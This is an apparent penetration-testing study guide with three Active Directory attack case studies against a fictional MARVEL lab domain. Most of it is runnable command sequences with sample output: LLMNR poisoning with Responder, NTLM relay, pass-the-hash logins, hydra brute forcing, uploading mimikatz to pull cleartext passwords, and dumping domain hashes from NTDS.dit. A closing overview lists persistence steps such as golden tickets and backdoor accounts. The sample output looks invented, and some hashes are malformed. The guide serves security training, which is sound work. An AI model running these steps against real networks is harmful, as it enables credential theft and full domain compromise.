# Active Directory Case Studies: Visual Guide with Examples

## Table of Contents
1. [AD Case Study 1](#ad-case-study-1)
2. [AD Case Study 2](#ad-case-study-2)
3. [AD Case Study 3](#ad-case-study-3)
4. [Comparison of Case Studies](#comparison-of-case-studies)
5. [General Strategies](#general-strategies)

---

## AD Case Study 1

### Scenario Overview

```
┌─────────────────────────────────────────────────────────────────┐
│            AD Case Study 1: Scenario Overview                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Constraints:                                                   │
│  ───────────                                                    │
│  • Cannot use MITM (IPv6 is disabled)                          │
│  • Passwords are uncrackable                                    │
│  • No direct password cracking possible                        │
│                                                                 │
│  Available Attack Vectors:                                      │
│  ───────────────────────────────────                            │
│  • Relay passwords                                              │
│  • Dump hashes                                                  │
│  • Find password reuse                                          │
│  • Relay again                                                  │
│  • Try connecting using hash (smbexec.py)                       │
│                                                                 │
│  Attack Strategy:                                               │
│  ────────────────────                                           │
│  1. Capture hashes via LLMNR poisoning                          │
│  2. Relay hashes to other systems                               │
│  3. Dump credentials from compromised systems                   │
│  4. Find password reuse across accounts                         │
│  5. Use hash-based authentication (smbexec.py)                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Flow Diagram

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Network   │
│             │                    │             │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Start LLMNR poisoning         │
       │     (IPv6 disabled, no MITM6)    │
       │─────────────────────────────────>│
       │                                  │
       │  2. Capture NTLM hashes          │
       │<─────────────────────────────────│
       │     MARVEL\fcastle::...:HASH     │
       │                                  │
       │  3. Relay hashes to targets      │
       │     ntlmrelayx.py                │
       │─────────────────────────────────>│
       │                                  │
       │  4. Access compromised systems   │
       │<─────────────────────────────────│
       │                                  │
       │  5. Dump credentials             │
       │     secretsdump.py               │
       │<─────────────────────────────────│
       │                                  │
       │  6. Find password reuse          │
       │     Compare hashes               │
       │                                  │
       │  7. Use hash-based auth          │
       │     smbexec.py                   │
       │─────────────────────────────────>│
       │                                  │
```

### Step-by-Step Attack Walkthrough

**Step 1: Start LLMNR Poisoning**

```bash
# Start LLMNR poisoning (IPv6 disabled, no MITM6)
sudo responder -I eth0 -dwP

# Output example:
[*] Responder started with the following options:
[*] Poisoners: HTTP, SMB, SQL, FTP, LLMNR, NBT-NS
[*] Listening for events...
[*] LLMNR poisoned for: HYDRA-DC
```

**Step 2: Capture NTLM Hashes**

```bash
# Captured hash example:
# MARVEL\fcastle::MARVEL:1122334455667788:aabbccddeeff001122334455667788:32ed87bdb5fdc5e9cba88547376818d4:::

# Save captured hashes to file
cat > captured_hashes.txt << 'EOF'
MARVEL\fcastle::MARVEL:1122334455667788:aabbccddeeff001122334455667788:32ed87bdb5fdc5e9cba88547376818d4:::
MARVEL\hawkeye::MARVEL:2233445566778899:bccddeeff00112233445566778899aa:3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a:::
MARVEL\ironman::MARVEL:3344556677889900:cdddeeff0011223344556677889900bb:4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d:::
EOF
```

**Step 3: Try Cracking Hashes**

```bash
# Try cracking hashes (will fail - passwords are uncrackable)
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt -O

# Output example:
Hashcat: No hashes cracked
Status: Exhausted
```

**Step 4: Relay Hashes to Targets**

```bash
# Relay hashes to other systems
ntlmrelayx.py -tf targets.txt -smb2support

# targets.txt content:
# 192.168.138.132
# 192.168.138.133
# 192.168.138.134

# Output example:
[*] SMB Server listening on 0.0.0.0:445
[*] Starting SMB Relay attacks
[*] Relaying MARVEL\fcastle to 192.168.138.133
[+] Relayed successfully to 192.168.138.133
[+] Access granted to 192.168.138.133
```

**Step 5: Dump Credentials from Compromised Systems**

```bash
# Dump credentials from compromised system
secretsdump.py MARVEL/fcastle@192.168.138.133 -hashes 32ed87bdb5fdc5e9cba88547376818d4

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Local Credentials
[*] SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Step 6: Find Password Reuse**

```bash
# Compare hashes to find password reuse
cat > all_hashes.txt << 'EOF'
MARVEL\fcastle:32ed87bdb5fdc5e9cba88547376818d4
MARVEL\hawkeye:3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a
MARVEL\ironman:4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d
Local\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
Local\ServiceAccount:32ed87bdb5fdc5e9cba88547376818d4
EOF

# Find duplicate hashes
sort all_hashes.txt | uniq -d

# Output example:
32ed87bdb5fdc5e9cba88547376818d4
# Password reuse found: fcastle and ServiceAccount have same password
```

**Step 7: Use Hash-Based Authentication**

```bash
# Try connecting using hash with smbexec.py
smbexec.py MARVEL/fcastle@192.168.138.133 -hashes :32ed87bdb5fdc5e9cba88547376818d4

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] SMBExec v1.0
[*] Authenticated as MARVEL\fcastle
C:\Windows\system32>whoami
marvel\fcastle

C:\Windows\system32>dir C:\
 Volume in drive C has no label.
 Volume Serial Number is XXXX-XXXX

 Directory of C:\

01/15/2024  10:30 AM    <DIR>          Windows
01/15/2024  10:30 AM    <DIR>          Program Files
```

### Key Techniques for Case Study 1

```
┌─────────────────────────────────────────────────────────────────┐
│            Key Techniques for Case Study 1                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. LLMNR Poisoning                                             │
│     ────────────────────                                        │
│     • Capture NTLM hashes from network traffic                  │
│     • Works even with IPv6 disabled                             │
│     • No MITM6 required                                         │
│     • Tool: Responder                                           │
│                                                                 │
│  2. SMB Relay                                                   │
│     ────────────────                                            │
│     • Relay captured hashes to other systems                    │
│     • Bypass authentication without cracking                    │
│     • Tool: ntlmrelayx.py                                       │
│                                                                 │
│  3. Credential Dumping                                          │
│     ────────────────────────                                    │
│     • Extract credentials from compromised systems              │
│     • Get local and domain credentials                          │
│     • Tool: secretsdump.py                                      │
│                                                                 │
│  4. Password Reuse Detection                                    │
│     ───────────────────────────────────                         │
│     • Compare hashes across accounts                            │
│     • Find accounts with same password                          │
│     • Expand access using reused passwords                      │
│                                                                 │
│  5. Hash-Based Authentication                                   │
│     ───────────────────────────────────                         │
│     • Use hashes directly for authentication                    │
│     • No need to crack passwords                                │
│     • Tool: smbexec.py, psexec.py, wmiexec.py                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## AD Case Study 2

### Scenario Overview

```
┌─────────────────────────────────────────────────────────────────┐
│            AD Case Study 2: Scenario Overview                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Constraints:                                                   │
│  ───────────                                                    │
│  • No relaying possible                                         │
│  • No MITM6 available                                           │
│  • No password cracking possible                               │
│                                                                 │
│  Available Attack Vectors:                                      │
│  ───────────────────────────────────                            │
│  • Look for active services                                     │
│  • Browse web for default credentials                           │
│  • Get access using default credentials                         │
│  • Try getting administrative password in clear                 │
│  • Use crackmapexec with found credentials                      │
│  • Try Wdigest on older Windows versions                        │
│                                                                 │
│  Attack Strategy:                                               │
│  ────────────────────                                           │
│  1. Scan for active services                                    │
│  2. Research default credentials online                         │
│  3. Attempt authentication with default credentials             │
│  4. Look for clear-text passwords                               │
│  5. Use Wdigest on older Windows systems                        │
│  6. Expand access using found credentials                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Flow Diagram

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Network   │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Scan for active services      │
       │     nmap, masscan                │
       │─────────────────────────────────>│
       │                                  │
       │  2. Identify services             │
       │<─────────────────────────────────│
       │     HTTP, SSH, RDP, SMB          │
       │                                  │
       │  3. Research default credentials  │
       │     web search                   │
       │                                  │
       │  4. Try default credentials       │
       │     crackmapexec                 │
       │─────────────────────────────────>│
       │                                  │
       │  5. Access granted               │
       │<─────────────────────────────────│
       │                                  │
       │  6. Look for clear passwords     │
       │     config files, registry       │
       │<─────────────────────────────────│
       │                                  │
       │  7. Try Wdigest (older Windows)  │
       │     mimikatz                     │
       │─────────────────────────────────>│
       │                                  │
       │  8. Expand access                │
       │     crackmapexec                 │
       │─────────────────────────────────>│
       │                                  │
```

### Step-by-Step Attack Walkthrough

**Step 1: Scan for Active Services**

```bash
# Scan network for active services
nmap -sV -p- 192.168.138.0/24

# Output example:
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.138.132
Host is up (0.0023s latency).
Not shown: 65532 closed tcp ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp   open  http        Apache httpd 2.4.41
443/tcp  open  ssl/http    Apache httpd 2.4.41
3389/tcp open  ms-wbt-server Microsoft Terminal Services
445/tcp  open  microsoft-ds Windows Server 2019

Nmap scan report for 192.168.138.133
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0
3306/tcp open  mysql   MySQL 8.0.27
```

**Step 2: Identify Services and Versions**

```bash
# Identify specific services and versions
nmap -sV --script=http-enum 192.168.138.132 -p 80,443

# Output example:
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.41
| http-enum:
|   /admin: Possible admin folder
|   /login: Login page
|   /config: Configuration files
443/tcp open  ssl/http Apache httpd 2.4.41
| http-enum:
|   /phpmyadmin: phpMyAdmin interface
```

**Step 3: Research Default Credentials**

```bash
# Research default credentials for identified services
# Apache httpd 2.4.41, phpMyAdmin, MySQL 8.0.27

# Common default credentials to try:
# Apache: admin/admin, admin/password, root/root
# phpMyAdmin: root/root, admin/admin, phpmyadmin/phpmyadmin
# MySQL: root/root, root/, admin/admin

# Create credentials list
cat > default_creds.txt << 'EOF'
admin:admin
admin:password
root:root
root:
admin:admin123
phpmyadmin:phpmyadmin
administrator:administrator
EOF
```

**Step 4: Try Default Credentials**

```bash
# Try default credentials on web services
hydra -L users.txt -P passwords.txt 192.168.138.132 http-get /admin

# Output example:
Hydra v9.1 (c) 2020 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

[DATA] max 16 tasks per 1 server, overall 16 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking http-get://192.168.138.132:80/admin/
[80][http-get] host: 192.168.138.132   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
```

**Step 5: Access System with Found Credentials**

```bash
# Access system with found credentials
crackmapexec smb 192.168.138.0/24 -u admin -p admin123

# Output example:
SMB         192.168.138.132  445    DC01            [+] MARVEL.local\admin:admin123 (Pwn3d!)
SMB         192.168.138.133  445    FILESRV         [+] MARVEL.local\admin:admin123 (Pwn3d!)
```

**Step 6: Look for Clear-Text Passwords**

```bash
# Connect to system and look for clear-text passwords
smbexec.py MARVEL/admin@192.168.138.132 -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] SMBExec v1.0
[*] Authenticated as MARVEL\admin
C:\Windows\system32>

# Look for configuration files with passwords
C:\Windows\system32>dir C:\inetpub\wwwroot\config
 Volume in drive C has no label.
 Volume Serial Number is XXXX-XXXX

 Directory of C:\inetpub\wwwroot\config

01/15/2024  10:30 AM               123 config.php
01/15/2024  10:30 AM               456 database.ini

# Read configuration files
C:\Windows\system32>type C:\inetpub\wwwroot\config\database.ini
[database]
host = localhost
username = dbadmin
password = DB_Passw0rd123!
database = marvel_db

# Found administrative password: DB_Passw0rd123!
```

**Step 7: Try Wdigest on Older Windows Systems**

```bash
# Check for older Windows systems (< Windows 8 & Windows 2012)
nmap -O 192.168.138.134

# Output example:
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.138.134
Host is up (0.0021s latency).
OS details: Windows 7

# Try Wdigest on older Windows system
# Upload mimikatz to target system
smbclient //192.168.138.134/c$ -U admin%admin123
put mimikatz.exe C:\Windows\Temp\mimikatz.exe

# Execute mimikatz to extract Wdigest credentials
psexec.py MARVEL/admin@192.168.138.134 -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Executing mimikatz
C:\Windows\system32>mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::wdigest
[...]
Username : Administrator
Domain   : MARVEL
Password : AdminPass123!
[...]
```

**Step 8: Expand Access Using Found Credentials**

```bash
# Use found administrative password
crackmapexec smb 192.168.138.0/24 -u Administrator -p AdminPass123!

# Output example:
SMB         192.168.138.132  445    DC01            [+] MARVEL.local\Administrator:AdminPass123! (Pwn3d!)
SMB         192.168.138.133  445    FILESRV         [+] MARVEL.local\Administrator:AdminPass123! (Pwn3d!)
SMB         192.168.138.134  445    OLD-SRV         [+] MARVEL.local\Administrator:AdminPass123! (Pwn3d!)

# Dump credentials from domain controller
secretsdump.py MARVEL/Administrator:AdminPass123!@192.168.138.132

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Target system is a Domain Controller
[*] Dumping NTDS.dit
MARVEL.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MARVEL.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2:::
```

### Key Techniques for Case Study 2

```
┌─────────────────────────────────────────────────────────────────┐
│            Key Techniques for Case Study 2                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Service Enumeration                                        │
│     ────────────────────────                                    │
│     • Scan for active services                                  │
│     • Identify service versions                                 │
│     • Tools: nmap, masscan                                      │
│                                                                 │
│  2. Default Credential Research                                │
│     ───────────────────────────────────                         │
│     • Research default credentials online                       │
│     • Try common username/password combinations                 │
│     • Tools: hydra, medusa                                      │
│                                                                 │
│  3. Clear-Text Password Discovery                               │
│     ───────────────────────────────────                         │
│     • Search configuration files                                │
│     • Check registry for passwords                              │
│     • Look for hardcoded credentials                            │
│                                                                 │
│  4. Wdigest Credential Extraction                               │
│     ───────────────────────────────────                         │
│     • Extract clear-text passwords from memory                  │
│     • Works on older Windows systems                            │
│     • Tool: mimikatz (sekurlsa::wdigest)                        │
│                                                                 │
│  5. Credential Expansion                                        │
│     ───────────────────────────────────                         │
│     • Use found credentials on other systems                    │
│     • Expand access across network                              │
│     • Tool: crackmapexec                                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## AD Case Study 3

### Scenario Overview

```
┌─────────────────────────────────────────────────────────────────┐
│            AD Case Study 3: Scenario Overview                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Constraints:                                                   │
│  ───────────                                                    │
│  • Limited initial access                                       │
│  • Need to find alternative attack vectors                      │
│                                                                 │
│  Available Attack Vectors:                                      │
│  ───────────────────────────────────                            │
│  • Intercept hashes circulating on network                      │
│  • Try to crack intercepted hashes                              │
│  • Access public shares with credentials                       │
│  • Find hardcoded credentials in documentation                  │
│  • Use found credentials for SMB access                        │
│  • Get admin access and dump credentials                        │
│                                                                 │
│  Attack Strategy:                                               │
│  ────────────────────                                           │
│  1. Intercept hashes from network traffic                      │
│  2. Try cracking intercepted hashes                            │
│  3. Access public shares with limited credentials              │
│  4. Find documentation with hardcoded credentials               │
│  5. Use found credentials for SMB access                       │
│  6. Gain admin access and dump credentials                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Flow Diagram

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Network   │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Intercept network hashes      │
       │     responder, wireshark         │
       │<─────────────────────────────────│
       │     MARVEL\user::...:HASH        │
       │                                  │
       │  2. Try cracking hashes          │
       │     hashcat                      │
       │                                  │
       │  3. Access public share          │
       │     smbclient                    │
       │─────────────────────────────────>│
       │                                  │
       │  4. Browse share contents        │
       │<─────────────────────────────────│
       │     Macbook setup procedure      │
       │                                  │
       │  5. Find hardcoded credentials   │
       │     in documentation             │
       │<─────────────────────────────────│
       │     admin:AdminPass123!          │
       │                                  │
       │  6. Use credentials for SMB      │
       │     crackmapexec                 │
       │─────────────────────────────────>│
       │                                  │
       │  7. Gain admin access            │
       │<─────────────────────────────────│
       │                                  │
       │  8. Dump credentials             │
       │     secretsdump.py               │
       │<─────────────────────────────────│
       │                                  │
```

### Step-by-Step Attack Walkthrough

**Step 1: Intercept Network Hashes**

```bash
# Start responder to intercept hashes
sudo responder -I eth0 -dwP

# Output example:
[*] Responder started with the following options:
[*] Poisoners: HTTP, SMB, SQL, FTP, LLMNR, NBT-NS
[*] Listening for events...
[*] LLMNR poisoned for: FILESRV
[*] Captured hash: MARVEL\jsmith::MARVEL:1122334455667788:aabbccddeeff001122334455667788:5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e:::
```

**Step 2: Try Cracking Intercepted Hashes**

```bash
# Try cracking intercepted hashes
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt -O

# Output example:
Hashcat v6.2.6 starting...
5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e:Password123!
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: captured_hashes.txt
Time.Started.....: Sat Jan 15 10:30:00 2024 (0 secs)
Time.Estimated...: Sat Jan 15 10:30:00 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 1234 H/s (0.03ms)
Recovered........: 1/1 (100.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Password123! -> Password123!

# Cracked password: Password123!
```

**Step 3: Access Public Share with Limited Credentials**

```bash
# Access public share with cracked credentials
smbclient //192.168.138.133/public -U jsmith%Password123!

# Output example:
Domain=[MARVEL] OS=[Windows Server 2019] Server=[Windows Server 2019 6.3]
smb: \> ls
  .                                   D        0  Sat Jan 15 10:30:00 2024
  ..                                  D        0  Sat Jan 15 10:30:00 2024
  Documents                           D        0  Sat Jan 15 10:30:00 2024
  Procedures                          D        0  Sat Jan 15 10:30:00 2024
  Shared                              D        0  Sat Jan 15 10:30:00 2024

                12345678 blocks of size 4096. 9876543 blocks available
```

**Step 4: Browse Share Contents**

```bash
# Browse Procedures directory
smb: \> cd Procedures
smb: \Procedures\> ls
  .                                   D        0  Sat Jan 15 10:30:00 2024
  ..                                  D        0  Sat Jan 15 10:30:00 2024
  Macbook_Setup_Guide.pdf             A    12345  Sat Jan 15 10:30:00 2024
  Network_Configuration.docx          A     6789  Sat Jan 15 10:30:00 2024
  Server_Maintenance.txt              A     3456  Sat Jan 15 10:30:00 2024

# Download Macbook setup guide
smb: \Procedures\> get Macbook_Setup_Guide.pdf
getting file \Procedures\Macbook_Setup_Guide.pdf of size 12345 as Macbook_Setup_Guide.pdf (1234.5 KiloBytes/sec) (average 1234.5 KiloBytes/sec)
```

**Step 5: Find Hardcoded Credentials in Documentation**

```bash
# Extract text from PDF
pdftotext Macbook_Setup_Guide.pdf Macbook_Setup_Guide.txt

# Search for credentials in the document
grep -i "password\|username\|admin\|credentials" Macbook_Setup_Guide.txt

# Output example:
# Macbook Setup Guide for MARVEL Domain
# ========================================
# 
# Step 1: Join Domain
# Username: marvel_admin
# Password: MarvelAdmin2024!
# 
# Step 2: Configure Network
# Username: network_admin
# Password: NetConfig123!
# 
# Step 3: Access File Server
# Username: file_admin
# Password: FileServer456!
# 
# Administrative Access:
# Username: Administrator
# Password: AdminPass123!
# 
# Note: These credentials are for initial setup only.
# Please change them after setup is complete.

# Found hardcoded credentials:
# marvel_admin:MarvelAdmin2024!
# network_admin:NetConfig123!
# file_admin:FileServer456!
# Administrator:AdminPass123!
```

**Step 6: Use Found Credentials for SMB Access**

```bash
# Try found credentials on SMB
crackmapexec smb 192.168.138.0/24 -u Administrator -p AdminPass123!

# Output example:
SMB         192.168.138.132  445    DC01            [+] MARVEL.local\Administrator:AdminPass123! (Pwn3d!)
SMB         192.168.138.133  445    FILESRV         [+] MARVEL.local\Administrator:AdminPass123! (Pwn3d!)
SMB         192.168.138.134  445    APPSRV          [+] MARVEL.local\Administrator:AdminPass123! (Pwn3d!)

# Try other found credentials
crackmapexec smb 192.168.138.0/24 -u marvel_admin -p MarvelAdmin2024!
crackmapexec smb 192.168.138.0/24 -u network_admin -p NetConfig123!
crackmapexec smb 192.168.138.0/24 -u file_admin -p FileServer456!
```

**Step 7: Gain Admin Access**

```bash
# Connect to domain controller with admin credentials
smbexec.py MARVEL/Administrator:AdminPass123!@192.168.138.132

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] SMBExec v1.0
[*] Authenticated as MARVEL\Administrator
C:\Windows\system32>whoami
marvel\administrator

C:\Windows\system32>net user
User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
krbtgt                    marvel_admin              network_admin
file_admin                fcastle                   hawkeye
The command completed successfully.

C:\Windows\system32>net group "Domain Admins"
Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator
fcastle
hawkeye
The command completed successfully.
```

**Step 8: Dump Credentials**

```bash
# Dump credentials from domain controller
secretsdump.py MARVEL/Administrator:AdminPass123!@192.168.138.132

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Target system is a Domain Controller
[*] Dumping NTDS.dit
MARVEL.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MARVEL.local\fcastle:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
MARVEL.local\hawkeye:1002:aad3b435b51404eeaad3b435b51404ee:3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a:::
MARVEL.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2:::
MARVEL.local\marvel_admin:1101:aad3b435b51404eeaad3b435b51404ee:4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d:::
MARVEL.local\network_admin:1102:aad3b435b51404eeaad3b435b51404ee:5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e:::
MARVEL.local\file_admin:1103:aad3b435b51404eeaad3b435b51404ee:6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f:::

# Save all credentials to file
cat > domain_credentials.txt << 'EOF'
MARVEL.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MARVEL.local\fcastle:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
MARVEL.local\hawkeye:1002:aad3b435b51404eeaad3b435b51404ee:3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a:::
MARVEL.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2:::
MARVEL.local\marvel_admin:1101:aad3b435b51404eeaad3b435b51404ee:4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d:::
MARVEL.local\network_admin:1102:aad3b435b51404eeaad3b435b51404ee:5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e:::
MARVEL.local\file_admin:1103:aad3b435b51404eeaad3b435b51404ee:6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f:::
EOF
```

### Key Techniques for Case Study 3

```
┌─────────────────────────────────────────────────────────────────┐
│            Key Techniques for Case Study 3                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Hash Interception                                           │
│     ────────────────────────                                    │
│     • Capture hashes from network traffic                       │
│     • Use LLMNR poisoning and responder                          │
│     • Tool: Responder, Wireshark                                │
│                                                                 │
│  2. Hash Cracking                                               │
│     ────────────────────                                        │
│     • Try cracking intercepted hashes                           │
│     • Use dictionary attacks                                    │
│     • Tool: hashcat, John the Ripper                            │
│                                                                 │
│  3. Public Share Access                                         │
│     ────────────────────────                                    │
│     • Access public shares with limited credentials             │
│     • Browse share contents for useful files                    │
│     • Tool: smbclient                                           │
│                                                                 │
│  4. Hardcoded Credential Discovery                              │
│     ───────────────────────────────────                         │
│     • Search documentation for credentials                      │
│     • Extract text from PDFs and documents                      │
│     • Look for setup guides and configuration files             │
│                                                                 │
│  5. Credential Expansion                                        │
│     ───────────────────────────────────                         │
│     • Use found credentials on other systems                    │
│     • Expand access across network                              │
│     • Tool: crackmapexec                                        │
│                                                                 │
│  6. Credential Dumping                                          │
│     ────────────────────────                                    │
│     • Dump credentials from compromised systems                 │
│     • Extract all domain password hashes                        │
│     • Tool: secretsdump.py                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Comparison of Case Studies

```
┌─────────────────────────────────────────────────────────────────┐
│            Comparison of Case Studies                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Case Study 1: Hash Relay & Reuse                              │
│  ───────────────────────────────────                            │
│  • Constraints: No MITM, uncrackable passwords                  │
│  • Primary technique: SMB relay, hash reuse                     │
│  • Tools: Responder, ntlmrelayx.py, smbexec.py                  │
│  • Success factor: Password reuse across systems               │
│                                                                 │
│  Case Study 2: Default Credentials & Wdigest                   │
│  ────────────────────────────────────────────────               │
│  • Constraints: No relaying, no MITM6, no cracking              │
│  • Primary technique: Default credentials, Wdigest              │
│  • Tools: nmap, hydra, mimikatz, crackmapexec                   │
│  • Success factor: Default credentials, clear-text passwords    │
│                                                                 │
│  Case Study 3: Hardcoded Credentials                           │
│  ───────────────────────────────────                            │
│  • Constraints: Limited initial access                          │
│  • Primary technique: Hash cracking, hardcoded credentials      │
│  • Tools: Responder, hashcat, smbclient, secretsdump.py         │
│  • Success factor: Hardcoded credentials in documentation       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Detailed Comparison Table

| Aspect | Case Study 1 | Case Study 2 | Case Study 3 |
|--------|--------------|--------------|--------------|
| **Primary Constraint** | No MITM, uncrackable passwords | No relaying, no MITM6, no cracking | Limited initial access |
| **Primary Technique** | SMB relay, hash reuse | Default credentials, Wdigest | Hash cracking, hardcoded credentials |
| **Key Tools** | Responder, ntlmrelayx.py, smbexec.py | nmap, hydra, mimikatz, crackmapexec | Responder, hashcat, smbclient, secretsdump.py |
| **Success Factor** | Password reuse across systems | Default credentials, clear-text passwords | Hardcoded credentials in documentation |
| **Difficulty Level** | Medium | Easy | Medium |
| **Detection Risk** | Medium | Low | Low |
| **Persistence Potential** | High | Medium | High |

---

## General Strategies

### Common Attack Patterns

```
┌─────────────────────────────────────────────────────────────────┐
│            Common Attack Patterns                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Initial Access                                              │
│     ────────────────────                                        │
│     • Hash interception (LLMNR poisoning)                       │
│     • Default credential exploitation                           │
│     • Service enumeration and exploitation                      │
│     • Public share access                                      │
│                                                                 │
│  2. Credential Harvesting                                       │
│     ────────────────────────                                    │
│     • Hash relay and reuse                                     │
│     • Credential dumping                                       │
│     • Clear-text password discovery                             │
│     • Wdigest extraction                                       │
│                                                                 │
│  3. Privilege Escalation                                        │
│     ───────────────────────────────────                         │
│     • Default credential exploitation                           │
│     • Hardcoded credential usage                               │
│     • Password reuse exploitation                              │
│     • Administrative access                                    │
│                                                                 │
│  4. Lateral Movement                                            │
│     ────────────────────                                        │
│     • Credential expansion                                     │
│     • Hash-based authentication                                │
│     • Service exploitation                                     │
│     • Network scanning                                         │
│                                                                 │
│  5. Persistence                                                 │
│     ────────────────                                           │
│     • Credential dumping                                       │
│     • Golden ticket creation                                   │
│     • Backdoor account creation                                │
│     • Scheduled task creation                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Tool Selection Guide

```
┌─────────────────────────────────────────────────────────────────┐
│            Tool Selection Guide                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Hash Interception                                              │
│  ────────────────────                                           │
│  • Responder: LLMNR/NBT-NS poisoning                            │
│  • Wireshark: Network traffic analysis                          │
│  • tcpdump: Packet capture                                      │
│                                                                 │
│  Hash Cracking                                                  │
│  ────────────────                                               │
│  • hashcat: GPU-accelerated cracking                           │
│  • John the Ripper: CPU-based cracking                         │
│  • Hashcat-utils: Hash manipulation                            │
│                                                                 │
│  Service Enumeration                                           │
│  ────────────────────────                                       │
│  • nmap: Port scanning and service detection                   │
│  • masscan: Fast port scanning                                  │
│  • enum4linux: SMB enumeration                                 │
│                                                                 │
│  Default Credential Testing                                    │
│  ───────────────────────────────────                            │
│  • hydra: Parallel login testing                               │
│  • medusa: Modular login testing                               │
│  • crackmapexec: SMB authentication testing                    │
│                                                                 │
│  Credential Dumping                                            │
│  ────────────────────────                                       │
│  • secretsdump.py: AD credential extraction                     │
│  • mimikatz: Windows credential extraction                      │
│  • LaZagne: Password recovery from applications                │
